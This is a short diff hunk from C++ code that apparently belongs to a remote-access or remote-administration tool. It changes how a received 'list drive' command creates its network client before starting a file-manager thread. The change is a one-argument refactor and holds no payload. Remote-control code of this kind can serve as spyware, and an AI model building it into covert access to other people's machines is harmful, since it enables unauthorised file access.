@@ -972,7 +972,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     }
 
     case COMMAND_LIST_DRIVE : {
-        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP);
+        m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn, publicIP, this);
         m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
         break;
     }
